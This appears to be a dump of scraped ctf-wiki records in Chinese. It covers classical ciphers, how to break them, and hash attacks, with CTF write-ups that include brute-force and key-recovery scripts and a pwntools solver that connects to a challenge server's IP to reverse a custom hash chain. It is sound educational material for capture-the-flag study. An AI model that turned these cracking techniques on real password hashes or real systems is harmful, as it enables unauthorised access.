用手机键盘表示就是：7382，那么这里就可以知道了，手机键盘加密方式不可能用 1 开头，第二位数字不可能超过 4，解密的时候参考此\n\n![picture](./figure/mobile.jpg)\n\n关于手机键盘加密还有另一种方式，就是「音的」式（这一点可能根据手机的不同会有所不同），具体参照手机键盘来打，例如：「数字」表示出来就是：748 94。在手机键盘上面按下这几个数，就会出：「数字」的拼音。\n\n### 电脑键盘棋盘\n\n电脑键盘棋盘加密，利用了电脑的棋盘方阵。\n\n![电脑棋盘加密](./figure/computer-chess.jpg)\n\n\n\n### 电脑键盘坐标\n\n电脑键盘坐标加密，利用键盘上面的字母行和数字行来加密，例：bye 用电脑键盘 XY 表示就是：351613\n\n![电脑键盘坐标加密](./figure/computer-x-y.jpg)\n\n\n\n### 电脑键盘 QWE\n\n电脑键盘 QWE 加密法，就是用字母表替换键盘上面的排列顺序。\n\n![computer-qwe](./figure/computer-qwe.jpg)\n\n\n\n### 键盘布局加密\n\n简单地说就是根据给定的字符在键盘上的样子来进行加密。\n\n### 0CTF 2014 classic\n\n> 小丁丁发现自己置身于一个诡异的房间，面前只有一扇刻着奇怪字符的门。 他发现门边上还有一道密码锁，似乎要输入密码才能开门。。4esxcft5 rdcvgt 6tfc78uhg 098ukmnb\n\n发现这么乱，还同时包括数字和字母猜想可能是键盘密码，试着在键盘上按照字母顺序描绘一下，可得到0ops字样，猜测就是flag了。\n\n### 2017年xman选拔赛——一二三，木头人\n\n> 我数123木头人，再不行动就要被扣分。\n>\n> 23731263111628163518122316391715262121\n>\n> 密码格式xman{flag}\n\n题目中有很明显的提示123，那么就自然需要联想到键盘密码中电脑键盘坐标密码，可以发现前几个数字第二个数字都是1-3范围内的，也验证了我们的猜测。于是\n\n> 23-x\n>\n> 73-m\n>\n> 12-a\n>\n> 63-n\n>\n> 11-q\n\n不对呀，密码格式是 `xman{`，第四个字符是 `{`，于是看了看 `{` 的位置，其并没有对应的横坐标，但是如果我们手动把它视为 11 的话，那么111就是 `{`。然后依次往后推，发现确实可行，，最后再把 121 视为 `}` 即可得到 flag。\n\n```\nxman{hintisenough}\n```\n\n从这里我们可以看出，我们还是要注意迁移性，不能单纯地照搬一些已有的知识。\n\n### 题目\n\n- 实验吧 奇怪的短信\n", "timestamp": "2025-10-21T22:02:53.510754"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/classical/polyalphabetic.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/classical/polyalphabetic.md", "content": "# 多表代换加密\n\n对于多表替换加密来说，加密后的字母几乎不再保持原来的频率，所以我们一般只能通过寻找算法实现对应的弱点进行破解。\n\n## Playfair\n\n### 原理\n\nPlayfair 密码（Playfair cipher or Playfair square）是一种替换密码，1854 年由英国人查尔斯·惠斯通（Charles Wheatstone）发明，基本算法如下：\n\n1.  选取一串英文字母，除去重复出现的字母，将剩下的字母逐个逐个加入 5 × 5 的矩阵内，剩下的空间由未加入的英文字母依 a-z 的顺序加入。注意，将 q 去除，或将 i 和 j 视作同一字。\n2.  将要加密的明文分成两个一组。若组内的字母相同，将 X（或 Q）加到该组的第一个字母后，重新分组。若剩下一个字，也加入 X 。\n3.  在每组中，找出两个字母在矩阵中的地方。\n    - 若两个字母不同行也不同列，在矩阵中找出另外两个字母（第一个字母对应行优先），使这四个字母成为一个长方形的四个角。\n    - 若两个字母同行，取这两个字母右方的字母（若字母在最右方则取最左方的字母）。\n    - 若两个字母同列，取这两个字母下方的字母（若字母在最下方则取最上方的字母）。\n\n新找到的两个字母就是原本的两个字母加密的结果。\n\n以 playfair example 为密匙，得\n\n```\nP L A Y F\nI R E X M\nB C D G H\nK N O Q S\nT U V W Z\n```\n\n要加密的讯息为 Hide the gold in the tree stump\n\n```\nHI DE TH EG OL DI NT HE TR EX ES TU MP\n```\n\n就会得到\n\n```\nBM OD ZB XD NA BE KU DM UI XM MO UV IF\n```\n\n### 工具\n\n- CAP4\n\n## Polybius\n\n### 原理\n\nPolybius密码又称为棋盘密码，其一般是将给定的明文加密为两两组合的数字，其常用密码表\n\n|      | 1   | 2   | 3   | 4   | 5    |\n| :--- | --- | --- | --- | --- | :--- |\n| 1    | A   | B   | C   | D   | E    |\n| 2    | F   | G   | H   | I/J | K    |\n| 3    | L   | M   | N   | O   | P    |\n| 4    | Q   | R   | S   | T   | U    |\n| 5    | V   | W   | X   | Y   | Z    |\n\n举个例子，明文 HELLO，加密后就是 23 15 31 31 34。\n\n另一种密码表\n\n|     | A   | D   | F   | G   | X   |\n| --- | --- | --- | --- | --- | --- |\n| A   | b   | t   | a   | l   | p   |\n| D   | d   | h   | o   | z   | k   |\n| F   | q   | f   | v   | s   | n   |\n| G   | g   | j   | c   | u   | x   |\n| X   | m   | r   | e   | w   | y   |\n\n注意，这里字母的顺序被打乱了。\n\nA D F G X 的由来：\n\n> 1918 年，第一次世界大战将要结束时，法军截获了一份德军电报，电文中的所有单词都由 A、D、F、G、X 五个字母拼成，因此被称为 ADFGX 密码。ADFGX 密码是 1918 年 3 月由德军上校 Fritz Nebel 发明的，是结合了 Polybius 密码和置换密码的双重加密方案。\n\n举个例子，HELLO，使用这个表格加密，就是 DD XF AG AG DF。\n\n### 工具\n\n- CrypTool\n\n### 例子\n\n这里以安恒杯 9 月 Crypto 赛题 Go 为例，题目为：\n\n> 密文：ilnllliiikkninlekile\n\n> 压缩包给了一行十六进制：546865206c656e677468206f66207468697320706c61696e746578743a203130\n\n> 请对密文解密\n\n首先对十六进制进行 hex 解码，得到字符串：\"The length of this plaintext: 10\"\n\n密文长度为 20 ，而明文长度为 10 ，密文只有 \" l \",\" i \",\" n \",\" k \",\" e \" 这五个字符，联想到棋盘密码。\n\n首先试一下五个字符按字母表顺序排列：\n\n|      | e   | i   | k   | l   | n    |\n| :--- | --- | --- | --- | --- | :--- |\n| e    | A   | B   | C   | D   | E    |\n| i    | F   | G   | H   | I/J | K    |\n| k    | L   | M   | N   | O   | P    |\n| l    | Q   | R   | S   | T   | U    |\n| n    | V   | W   | X   | Y   | Z    |\n\n根据密文解密得：iytghpkqmq。\n\n这应该不是我们想要的 flag 答案。\n\n看来这五个字符排列不是这么排列的，一共有 5! 种情况，写脚本爆破：\n\n```python\nimport itertools\n\nkey = []\ncipher = \"ilnllliiikkninlekile\"\n\nfor i in itertools.permutations('ilnke', 5):\n    key.append(''.join(i))\n\nfor now_key in key:\n    solve_c = \"\"\n    res = \"\"\n    for now_c in cipher:\n        solve_c += str(now_key.index(now_c))\n    for i in range(0,len(solve_c),2):\n        now_ascii = int(solve_c[i])*5+int(solve_c[i+1])+97\n        if now_ascii>ord('i'):\n            now_ascii+=1\n        res += chr(now_ascii)\n    if \"flag\" in res:\n        print now_key,res\n```\n脚本其实就是实现棋盘密码这个算法，只是这五个字符的顺序不定。\n\n跑出下面两个结果：\n\n> linke flagishere\n\n> linek flagkxhdwd\n\n显然第一个是我们想要的答案。\n\n附上正确的密码表：\n\n|      | l   | i   | n   | k   | e    |\n| :--- | --- | --- | --- | --- | :--- |\n| l    | A   | B   | C   | D   | E    |\n| i    | F   | G   | H   | I/J | K    |\n| n    | L   | M   | N   | O   | P    |\n| k    | Q   | R   | S   | T   | U    |\n| e    | V   | W   | X   | Y   | Z    |\n\n## Vigenere 维吉尼亚密码\n\n### 原理\n\n维吉尼亚密码（Vigenere）是使用一系列凯撒密码组成密码字母表的加密算法，属于多表密码的一种简单形式。\n\n![维吉尼亚表格](./figure/vigenere1.jpg)\n\n下面给出一个例子\n\n```\n明文：come greatwall\n密钥：crypto\n```\n\n首先，对密钥进行填充使其长度与明文长度一样。\n\n| 明文 | c   | o   | m   | e   | g   | r   | e   | a   | t   | w   | a   | l   | l   |\n| ---- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |\n| 密钥 | c   | r   | y   | p   | t   | o   | c   | r   | y   | p   | t   | o   | c   |\n\n其次，查表得密文\n\n![维吉尼亚加密](./figure/vigenere2.jpg)\n\n```\n明文：come greatwall\n密钥：crypto\n密文：efkt zfgrrltzn\n```\n### 破解\n\n对包括维吉尼亚密码在内的所有多表密码的破译都是以字母频率为基础的，但直接的频率分析却并不适用，这是因为在维吉尼亚密码中，一个字母可以被加密成不同的密文，因而简单的频率分析在这里并没有用。\n\n**破译维吉尼亚密码的关键在于它的密钥是循环重复的。** 如果我们知道了密钥的长度，那密文就可以被看作是交织在一起的凯撒密码，而其中每一个都可以单独破解。关于密码的长度，我们可以 使用卡西斯基试验和弗里德曼试验来获取。\n\n卡西斯基试验是基于类似 the 这样的常用单词有可能被同样的密钥字母进行加密，从而在密文中重复出现。例如，明文中不同的 CRYPTO 可能被密钥 ABCDEF 加密成不同的密文：\n\n```\n密钥：ABCDEF AB CDEFA BCD EFABCDEFABCD\n明文：CRYPTO IS SHORT FOR CRYPTOGRAPHY\n密文：CSASXT IT UKSWT GQU GWYQVRKWAQJB\n```\n\n此时明文中重复的元素在密文中并不重复。然而，如果密钥相同的话，结果可能便为（使用密钥 ABCD）：\n\n```\n密钥：ABCDAB CD ABCDA BCD ABCDABCDABCD\n明文：CRYPTO IS SHORT FOR CRYPTOGRAPHY\n密文：CSASTP KV SIQUT GQU CSASTPIUAQJB\n```\n\n此时卡西斯基试验就能产生效果。对于更长的段落此方法更为有效，因为通常密文中重复的片段会更多。如通过下面的密文就能破译出密钥的长度：\n\n```\n密文：DYDUXRMHTVDVNQDQNWDYDUXRMHARTJGWNQD\n```\n\n其中，两个 DYDUXRMH 的出现相隔了 18 个字母。因此，可以假定密钥的长度是 18 的约数，即长度为 18、9、6、3 或 2。而两个 NQD 则相距 20 个字母，意味着密钥长度应为 20、10、5、4 或 2。取两者的交集，则可以基本确定密钥长度为 2。接下来就是进行进一步的操作了。\n\n关于更加详细的破解原理，这里暂时不做过多的介绍。可以参考http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-vigenere-cipher/。\n\n### 工具\n\n-   已知密钥\n    - Python 的 pycipher 库\n    - [在线解密 Vigenère cipher](http://planetcalc.com/2468/)\n    - CAP4\n-   未知密钥\n    - [Vigenère Cipher Codebreaker](http://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx)\n    - [Vigenere Solver](https://www.guballa.de/vigenere-solver) ，不够完善。\n\n## Nihilist\n\n### 原理\n\nNihilist密码又称关键字密码：明文 + 关键字 = 密文。以关键字 helloworld 为例。\n\n首先利用密钥构造棋盘矩阵（类似 Polybius 密码）\n- 新建一个 5 × 5 矩阵\n- 将字符不重复地依次填入矩阵\n- 剩下部分按字母顺序填入\n- 字母 i 和 j 等价\n\n|     | 1   | 2   | 3     | 4   | 5   |\n| --- | --- | --- | ----- | --- | --- |\n| 1   | h   | e   | l     | o   | w   |\n| 2   | r   | d   | a     | b   | c   |\n| 3   | f   | g   | i / j | k   | m   |\n| 4   | n   | p   | q     | s   | t   |\n| 5   | u   | v   | x     | y   | z   |\n\n对于加密过程参照矩阵 M 进行加密：\n\n```\na -> M[2,3] -> 23\nt -> M[4,5] -> 45\n```\n对于解密过程\n\n参照矩阵 M 进行解密：\n\n```\n23 -> M[2,3] -> a\n45 -> M[4,5] -> t\n```\n可以看出，密文的特征有如下几点\n\n- 纯数字\n- 只包含 1 到 5\n- 密文长度偶数。\n\n## Hill\n\n### 原理\n\n希尔密码（Hill）使用每个字母在字母表中的顺序作为其对应的数字，即A=0，B=1，C=2 等，然后将明文转化为 n 维向量，跟一个 n × n 的矩阵相乘，再将得出的结果模 26。注意用作加密的矩阵（即密匙）在 $\\mathbb{Z}_{26}^{n}$ 必须是可逆的，否则就不可能解码。只有矩阵的行列式和 26 互质，才是可逆的。下面举一个例子\n\n```\n明文：ACT\n```\n\n将明文化为矩阵。\n\n$$\n\\begin{bmatrix}\n0\\\\\n2\\\\\n19\n\\end{bmatrix}\n$$\n\n假设密钥为：\n\n$$\n\\begin{bmatrix}\n6 & 24 & 1\\\\\n13 & 16 & 10\\\\\n20 & 17 & 15\n\\end{bmatrix}\n$$\n\n加密过程为：\n\n$$\n\\begin{bmatrix}\n6 & 24 & 1\\\\\n13 & 16 & 10\\\\\n20 & 17 & 15\n\\end{bmatrix}\n\\begin{bmatrix}\n0\\\\\n2\\\\\n19\n\\end{bmatrix}\n\\equiv\n\\begin{bmatrix}\n67\\\\\n222\\\\\n319\n\\end{bmatrix}\n\\equiv\n\\begin{bmatrix}\n15\\\\\n14\\\\\n7\n\\end{bmatrix}\n\\bmod 26\n$$\n\n密文即为\n\n```\n密文：POH\n```\n\n### 工具\n\n- http://www.practicalcryptography.com/ciphers/hill-cipher/\n- CAP4\n- Cryptool\n\n### 例子\n\n这里我们以ISCC 2015 base decrypt 150为例进行介绍，题目为\n\n> 密文： 22,09,00,12,03,01,10,03,04,08,01,17 （wjamdbkdeibr）\n>\n> 使用的矩阵是 1 2 3 4 5 6 7 8 10\n>\n> 请对密文解密.\n\n首先，矩阵是 3 × 3 的。说明每次加密3个字符。我们直接使用 Cryptool，需要注意的是，这个矩阵是按照列来排布的。即如下\n\n```\n1 4 7\n2 5 8\n3 6 10\n```\n\n最后的结果为 `overthehillx`。\n\n## AutokeyCipher\n\n### 原理\n\n自动密钥密码（Autokey Cipher）也是多表替换密码，与维吉尼亚密码密码类似，但使用不同的方法生成密钥。通常来说它要比维吉尼亚密码更安全。自动密钥密码主要有两种，关键词自动密钥密码和原文自动密钥密码。下面我们以关键词自动密钥为例：\n\n```\n明文：THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG\n关键词：CULTURE\n```\n\n自动生成密钥：\n\n```\nCULTURE THE QUICK BROWN FOX JUMPS OVER THE\n```\n\n接下来的加密过程和维吉尼亚密码类似，从相应的表格可得：\n\n密文\n\n```\nVBP JOZGD IVEQV HYY AIICX CSNL FWW ZVDP WVK\n```\n\n### 工具\n\n-   已知关键词\n    - Python 的 pycipher 库\n-   未知关键词\n    - http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/\n    - **tools 文件夹下 break_autokey.py，待完成。**\n", "timestamp": "2025-10-21T22:02:53.635066"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/classical/summary.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/classical/summary.md", "content": "# 总结\n\n## 古典密码分析思路\n\nCTF 中有关古典密码的题目，通常是根据密文求出明文，因此采用**唯密文攻击**居多，基本分析思路总结如下：\n\n1. 确定密码类型：根据题目提示、加密方式、密文字符集、密文展现形式等信息。\n2. 确定攻击方法：包括直接分析、蛮力攻击、统计分析等方法。对于无法确定类型的特殊密码，应根据其密码特性选用合适的攻击方法。\n3. 确定分析工具：以在线密码分析工具与 Python 脚本工具包为主，以离线密码分析工具与手工分析为辅。\n\n以上唯密文攻击方法的适用场景与举例如下：\n\n| 攻击方法   | 适用场景                           | 举例                                   |\n| ---------- | ---------------------------------- | -------------------------------------- |\n| 直接分析法 | 由密码类型可确定映射关系的代换密码 | 凯撒密码、猪圈密码、键盘密码等         |\n| 蛮力攻击法 | 密钥空间较小的代换密码或置换密码   | 移位密码、栅栏密码等                   |\n| 统计分析法 | 密钥空间较大的代换密码             | 简单替换密码、仿射密码、维吉尼亚密码等 |\n\n## 实验吧 围在栅栏里的爱\n\n题目描述\n\n> 最近一直在好奇一个问题，QWE 到底等不等于 ABC？\n>\n> -.- .. --.- .-.. .-- - ..-. -.-. --.- --. -. ... --- ---\n>\n> flag格式：CTF{xxx}\n\n首先，根据密码样式判断是摩斯电码，解密后得到 `KIQLWTFCQGNSOO`，看着也不像 flag，题目中还有还有栅栏与 `QWE到底等不等于ABC`，两个都试了试之后，发现是先 QWE 然后栅栏可得到结果。  \n\n首先键盘 QWE 解密，试着解密得到 `IILYOAVNEBSAHR`。继而栅栏解密得到 `ILOVESHIYANBAR`。\n\n## 2017 SECCON Vigenere3d\n\n程序如下\n\n```python\n# Vigenere3d.py\nimport sys\ndef _l(idx, s):\n    return s[idx:] + s[:idx]\ndef main(p, k1, k2):\n    s = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_{}\"\n    t = [[_l((i+j) % len(s), s) for j in range(len(s))] for i in range(len(s))]\n    i1 = 0\n    i2 = 0\n    c = \"\"\n    for a in p:\n        c += t[s.find(a)][s.find(k1[i1])][s.find(k2[i2])]\n        i1 = (i1 + 1) % len(k1)\n        i2 = (i2 + 1) % len(k2)\n    return c\nprint main(sys.argv[1], sys.argv[2], sys.argv[2][::-1])\n\n$ python Vigenere3d.py SECCON{**************************} **************\nPOR4dnyTLHBfwbxAAZhe}}ocZR3Cxcftw9\n```\n\n**解法一**：\n\n首先，我们先来分析一下 t 的构成\n$$\nt[i][j]=s[i+j:]+s[:i+j] \\\\\nt[i][k]=s[i+k:]+s[:i+k]\n$$\n\n$t[i][j][k]$ 为 $t[i][j]$ 中的第 k 个字符，$t[i][k][j]$ 为 $t[i][k]$ 中的第 j 个字符。无论是 $i+j+k$ 是否超过 `len(s)` 两者都始终保持一致，即 $t[i][j][k]=t[i][k][j]$ 。\n\n故而，其实对于相同的明文来说，可能有多个密钥使其生成相同的密文。\n\n然而上面分析就是单纯地分析而已，，下面开始正题。\n\n不难看出，密文的每一位只与明文的相应位相关，而且，密钥的每一位的空间最大也就是 s 的大小，所以我们可以使用爆破来获取密钥。这里根据上述命令行提示，可以知道密钥长度为 14，恰好明文前面7个字节已知。恢复密钥的 exp 如下\n\n```python\ndef get_key(plain, cipher):\n    s = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_{}\"\n    t = [[_l((i + j) % len(s), s) for j in range(len(s))]\n         for i in range(len(s))]\n    i1 = 0\n    i2 = 0\n    key = ['*'] * 14\n    for i in range(len(plain)):\n        for i1 in range(len(s)):\n            for i2 in range(len(s)):\n                if t[s.find(plain[i])][s.find(s[i1])][s.find(s[i2])] == cipher[\n                        i]:\n                    key[i] = s[i1]\n                    key[13 - i] = s[i2]\n    return ''.join(key)\n```\n\n恢复明文的脚本如下\n\n```python\ndef decrypt(cipher, k1, k2):\n    s = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_{}\"\n    t = [[_l((i + j) % len(s), s) for j in range(len(s))]\n         for i in range(len(s))]\n    i1 = 0\n    i2 = 0\n    plain = \"\"\n    for a in cipher:\n        for i in range(len(s)):\n            if t[i][s.find(k1[i1])][s.find(k2[i2])] == a:\n                plain += s[i]\n                break\n        i1 = (i1 + 1) % len(k1)\n        i2 = (i2 + 1) % len(k2)\n    return plain\n```\n\n得到明文如下\n\n```shell\n➜  2017_seccon_vigenere3d git:(master) python exp.py\nSECCON{Welc0me_to_SECCON_CTF_2017}\n```\n**解法二**\n\n关于此题的分析：\n\n1. 考虑到在程序正常运行下，数组访问不会越界，我们在讨论时做以下约定：$arr[index] \\Leftrightarrow arr[index \\% len(arr)]$\n2. 关于 python 程序中定义的 `_l` 函数，发现以下等价关系：$\\_l(offset, arr)[index] \\Leftrightarrow arr[index + offset]$\n3. 关于 python 的 main 函数中三维矩阵 t 的定义，发现以下等价关系：$t[a][b][c] \\Leftrightarrow \\_l(a+b, s)[c]$\n4. 综合第 2 第 3 点的观察，有如下等价关系：$t[a][b][c] \\Leftrightarrow s[a+b+c]$\n5. 我们将 s 视为一种编码格式，即：编码过程 s.find(x)，解码过程 s[x]。并直接使用其编码结果的数字替代其所代指的字符串，那么加密过程可以用以下公式表示：\n   - $e = f +  k1 +k2$\n   - 其中，e 是密文，f 是明文，k1 与 k2 是通过复制方法得到、与 f 长度一样的密钥，**加法是向量加**。\n\n所以我们只需要通过计算 `k1+k2` ，模拟密钥，即可解密。关于此题的解密 python 脚本：\n\n```python\n# exp2.py\nenc_str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_{}'\ndec_dic = {k:v for v,k in enumerate(enc_str)}\nencrypt = 'POR4dnyTLHBfwbxAAZhe}}ocZR3Cxcftw9'\nflag_bg = 'SECCON{**************************}'\n\nsim_key = [dec_dic[encrypt[i]]-dec_dic[flag_bg[i]] for i in range(7)] # 破解模拟密钥\nsim_key = sim_key + sim_key[::-1]\n\nflag_ed = [dec_dic[v]-sim_key[k%14] for k,v in enumerate(encrypt)] # 模拟密钥解密\nflag_ed = ''.join([enc_str[i%len(enc_str)] for i in flag_ed]) # 解码\nprint(flag_ed)\n```\n\n得到明文如下：\n\n```bash\n$ python exp2.py\nSECCON{Welc0me_to_SECCON_CTF_2017}\n```\n\n## 消失的三重密码\n\n密文\n```\nof zit kggd zitkt qkt ygxk ortfzoeqs wqlatzwqssl qfr zvg ortfzoeqs yggzwqssl. fgv oy ngx vqfz zg hxz zitd of gft soft.piv dgfn lgsxzogfl qkt zitkt? zohl:hstqlt eiqfut zit ygkd gy zit fxdwtk ngx utz.zit hkgukqddtkl!\n```\n\n使用 quipquip 直接解密。\n", "timestamp": "2025-10-21T22:02:53.792212"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/hash/attack.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/hash/attack.md", "content": "# Hash Attack\n\n常见的Hash函数的攻击方法主要有\n\n-  暴力攻击：不依赖于任何算法细节，仅与Hash值长度有关；\n  - 生日攻击法(Birthday Attack)：没有利用Hash函数的结构和任何代数弱性质，只依赖于消息摘要的长度，即Hash值的长度。\n  - 中点交会攻击法(Meet-In-The-Middle)：是生日攻击的一种变形，不比较Hash值，而是比较中间变量。这种攻击主要适用于攻击具有分组链结构的Hash方案。\n-  密码分析：依赖于具体算法的设计缺点。\n\n## 暴力攻击\n\n **HashCat 工具** 可以说是目前最好的基于 CPU 和 GPU 破解 Hash 的软件，相关链接如下\n\n[HashCat 官网](http://www.hashcat.net/hashcat/)\n\n[HashCat 简单使用](http://www.freebuf.com/sectool/112479.html)\n\n## 哈希长度拓展攻击（hash length extension attacks）\n### 介绍\n\n基本定义如下，源自[维基百科](https://zh.wikipedia.org/wiki/%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB)。\n\n哈希长度扩展攻击(Hash Length Extension Attacks)是指针对某些允许包含额外信息的加密散列函数的攻击手段。该攻击适用于在**消息与密钥的长度已知**的情形下，所有采取了 H(key ∥ message) 此类构造的散列函数。MD5和SHA-1 等基于 Merkle–Damgård 构造的算法均对此类攻击显示出脆弱性。\n\n这类哈希函数有以下特点\n\n- 消息填充方式都比较类似，首先在消息后面添加一个1，然后填充若干个0，直至总长度与 448 同余，最后在其后附上64位的消息长度（填充前）。\n- 每一块得到的链接变量都会被作为下一次执行hash函数的初始向量IV。在最后一块的时候，才会将其对应的链接变量转换为hash值。\n\n一般攻击时应满足如下条件\n\n- 我们已知 key 的长度，如果不知道的话，需要爆破出来\n- 我们可以控制 message 的消息。\n- 我们已经知道了包含 key 的一个消息的hash值。\n\n这样我们就可以得到一对(messge,x)满足x=H(key ∥ message)虽然我们并不清楚key的内容。\n\n### 攻击原理\n\n这里不妨假设我们我们知道了 hash(key+s) 的 hash 值，其中 s 是已知的，那么其本身在计算的时候，必然会进行填充。那么我们首先可以得到 key+s 扩展后的字符串 now，即\n\nnow=key|s|padding\n\n那么如果我们在 now 的后面再次附加上一部分信息extra，即\n\nkey|s|padding|extra\n\n这样再去计算hash值的时候，\n\n1. 会对 extra 进行填充直到满足条件。\n2. 先计算 now 对应的链接变量 IV1，而我们已经知道这部分的 hash 值，并且链接变量产生 hash 值的算法是可逆的，所以我们可以得到链接变量。\n3. 下面会根据得到的链接变量 IV1，对 extra 部分进行哈希算法，并返回hash值。\n\n那么既然我们已经知道了第一部分的 hash 值，并且，我们还知道 extra 的值，那么我们便可以得到最后的hash值。\n\n而之前我们也说了我们可以控制 message 的值。那么其实 s，padding，extra 我们都是可以控制的。所以我们自然可以找到对应的(message,x)满足x=hash(key|message)。\n\n### 例子\n\n似乎大都是web里面的，，不太懂web，暂时先不给例子了。\n\n### 工具\n\n- [hashpump](https://github.com/bwall/HashPump)\n\n如何使用请参考github上的readme。\n\n## hash算法设计有误\n一些自定义的hash算法可能是可逆的。\n\n### Hashinator\n题目的逻辑很简单，从一个知名的密码字典\"rockyou\"挑选出一个`password`，并且使用多种hash算法随机的哈希32轮。我们需要从最后的hash结果中破解出原始的`password`。\n\n#### 分析\n题目采用的hash算法有：`md5`，`sha1`，`blake`，`scrypt`。\n关键的代码如下：\n```python\n    password = self.generate_password()     # from rock_you.txt\n    salt = self.generate_salt(password)     # 与password的长度有关\n    hash_rounds = self.generate_rounds()    # 生成进行hash算法的顺序\n    password_hash = self.calculate_hash(salt + password, hash_rounds)\n```\n1. 程序首先通过从`rockyou.txt`中随机抽取一个`password`，作为加密的明文。\n2. 然后根据抽取的`password`的长度，生成一个长度为`128 - len(password)`的`salt`。\n3. 从之前列举的4种hash算法中抽取，组成32轮的哈希运算。\n4. 根据之前得到的`password`、`salt`计算出最后给我们的`password_hash`。\n\n很明显，我们不可能通过逆向hash算法来完成题目。\n我们知道所有的可能的明文，首先考虑能否通过构造彩虹表来完成穷举。但是注意到`generate_salt()`函数中，`salt`和`password`的长度组合超过了128byte的长度，并且被注释了\n```\n    msize = 128 # f-you hashcat :D\n```\nso，只能无奈放弃。\n\n那这样的话，只存在一种可能，也即算法可逆。查看`calculate_hash()`函数的具体实现，可以发现如下可疑的代码：\n```python\nfor i in range(len(hash_rounds)):\n    interim_salt = xor(interim_salt, hash_rounds[-1-i](interim_hash))\n    interim_hash = xor(interim_hash, hash_rounds[i](interim_salt))\nfinal_hash = interim_salt + interim_hash\n```\n重新梳理一下我们知道的信息：\n1. hash_rounds中保存了32轮，即每轮要使用的hash函数句柄。\n2. final_hash是最后给我们的hash结果。\n3. hash_rounds中的内容也会在生成之后打印给我们。\n4. 我们希望得到`interim_salt`和`interim_hash`在第一轮的值。\n5. `interim_salt`和`interim_hash`的长度均为64byte。\n\n仔细观察一下`interim_salt`和`interim_hash`的计算方法，可以发现它是可逆的。\n\n$$\ninterim\\_hash_1 = interim\\_hash_2 \\oplus hash\\_rounds[i](interim\\_salt_3)\n$$\n\n这行代码里，我们已知 $interim\\_hash_1$ 和 $interim\\_salt_3$，由此可以推出$interim\\_hash_2$的值，而$interim\\_hash_2$则是上一轮的`interim_hash`。\n以此方法逆推32次，则可以得到最初的`password`和`salt`。\n\n具体的解密脚本为：\n```python\nimport os\nimport hashlib\nimport socket\nimport threading\nimport socketserver\nimport struct\nimport time\nimport threading\n# import pyscrypt\nfrom base64 import b64encode, b64decode\nfrom pwn import *\ndef md5(bytestring):\n    return hashlib.md5(bytestring).digest()\ndef sha(bytestring):\n    return hashlib.sha1(bytestring).digest()\ndef blake(bytestring):\n    return hashlib.blake2b(bytestring).digest()\ndef scrypt(bytestring):\n    l = int(len(bytestring) / 2)\n    salt = bytestring[:l]\n    p = bytestring[l:]\n    return hashlib.scrypt(p, salt=salt, n=2**16, r=8, p=1, maxmem=67111936)\n    # return pyscrypt.hash(p, salt, 2**16, 8, 1, dkLen=64)\ndef xor(s1, s2):\n    return b''.join([bytes([s1[i] ^ s2[i % len(s2)]]) for i in range(len(s1))])\ndef main():\n    # io = socket.socket(family=socket.AF_INET)\n    # io.connect(('47.88.216.38', 20013))\n    io = remote('47.88.216.38', 20013)\n    print(io.recv(1000))\n    ans_array = bytearray()\n    while True:\n        buf = io.recv(1)\n        if buf:\n            ans_array.extend(buf)\n        if buf == b'!':\n            break\n\n    password_hash_base64 = ans_array[ans_array.find(b\"b'\") + 2: ans_array.find(b\"'\\n\")]\n    password_hash = b64decode(password_hash_base64)\n    print('password:', password_hash)\n    method_bytes = ans_array[\n        ans_array.find(b'used:\\n') + 6 : ans_array.find(b'\\nYour')\n    ]\n    methods = method_bytes.split(b'\\n')\n    methods = [bytes(x.strip(b'- ')).decode() for x in methods]\n    print(methods)\n    in_salt = password_hash[:64]\n    in_hash = password_hash[64:]\n    for pos, neg in zip(methods, methods[::-1]):\n        '''\n            interim_salt = xor(interim_salt, hash_rounds[-1-i](interim_hash))\n            interim_hash = xor(interim_hash, hash_rounds[i](interim_salt))\n        '''\n        in_hash = xor(in_hash, eval(\"{}(in_salt)\".format(neg)))\n        in_salt = xor(in_salt, eval(\"{}(in_hash)\".format(pos)))\n    print(in_hash, in_salt)\n    print(in_hash[-20:])\n    io.interactive()\nmain()\n\n```\n\n#### 原hash算法\n```python\n\nimport os\nimport hashlib\nimport socket\nimport threading\nimport socketserver\nimport struct\nimport time\n\n# import pyscrypt\n\nfrom base64 import b64encode\n\ndef md5(bytestring):\n    return hashlib.md5(bytestring).digest()\n\ndef sha(bytestring):\n    return hashlib.sha1(bytestring).digest()\n\ndef blake(bytestring):\n    return hashlib.blake2b(bytestring).digest()\n\ndef scrypt(bytestring):\n    l = int(len(bytestring) / 2)\n    salt = bytestring[:l]\n    p = bytestring[l:]\n    return hashlib.scrypt(p, salt=salt, n=2**16, r=8, p=1, maxmem=67111936)\n    # return pyscrypt.hash(p, salt, 2**16, 8, 1)\n\ndef xor(s1, s2):\n    return b''.join([bytes([s1[i] ^ s2[i % len(s2)]]) for i in range(len(s1))])\n\nclass HashHandler(socketserver.BaseRequestHandler):\n\n    welcome_message = \"\"\"\nWelcome, young wanna-be Cracker, to the Hashinator.\n\nTo prove your worthiness, you must display the power of your cracking skills.\n\nThe test is easy:\n1. We send you a password from the rockyou list, hashed using multiple randomly chosen algorithms.\n2. You crack the hash and send back the original password.\n\nAs you already know the dictionary and won't need any fancy password rules, {} seconds should be plenty, 